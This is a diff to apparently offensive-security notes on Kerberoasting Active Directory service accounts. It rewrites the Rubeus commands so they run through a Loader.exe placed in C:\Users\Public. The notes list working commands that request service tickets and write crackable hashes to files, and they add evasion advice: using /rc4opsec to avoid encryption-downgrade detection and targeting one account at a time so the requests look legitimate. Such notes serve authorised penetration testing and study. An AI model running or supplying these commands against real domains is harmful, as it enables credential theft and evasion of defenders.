@@ -10,7 +10,7 @@ Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincip
 
 Check with Rubeus
 ```powershell
-.\Loader.exe -path .\Rubeus.exe -args kerberoast /stats
+C:\Users\Public\Loader.exe -path C:\Users\Public\Rubeus.exe -args kerberoast /stats
 ```
 
 > [!NOTE] Nore
@@ -20,21 +20,21 @@ To avoid detections based on Encryption Downgrade for Kerberos EType (used by li
 
 **DO ONE ACCOUNT AT A TIME TO HAVE THE TICKET REQUESTS LOOK LEGITIMATE**
 ```powershell
-.\Loader.exe -path .\Rubeus.exe -args kerberoast /stats /rc4opsec
-.\Loader.exe -path .\Rubeus.exe -args kerberoast /user:svcadmin /simple /rc4opsec /outfile:svcadmin.hash
+C:\Users\Public\Loader.exe -path C:\Users\Public\Rubeus.exe -args kerberoast /stats /rc4opsec
+C:\Users\Public\Loader.exe -path C:\Users\Public\Rubeus.exe -args kerberoast /user:svcadmin /simple /rc4opsec /outfile:svcadmin.hash
 
-.\Loader.exe -path .\Rubeus.exe -args kerberoast /rc4opsec /outfile:hashes.txt
+C:\Users\Public\Loader.exe -path C:\Users\Public\Rubeus.exe -args kerberoast /rc4opsec /outfile:hashes.txt
 ```
 
 ### Standard Kerberoast
 Target a single user - **Adding `/tgtdeleg` will give us a RC4 ticket increasing cracking speeds (Doesn't work on Windows server 2019 and up)** 
-```bash
-.\Rubeus.exe kerberoast /tgtdeleg /user:sapservice /nowrap
+```powershell
+C:\Users\Public\Loader.exe -path  C:\Users\Public\Rubeus.exe -args kerberoast /tgtdeleg /user:sapservice /nowrap
 ```
 
 Target admin accounts
 ```powershell
-.\Rubeus.exe kerberoast /tgtdeleg /ldapfilter:'admincount=1' /nowrap
+C:\Users\Public\Loader.exe -path C:\Users\Public\Rubeus.exe -args kerberoast /tgtdeleg /ldapfilter:'admincount=1' /nowrap
 ```
 
 --- 
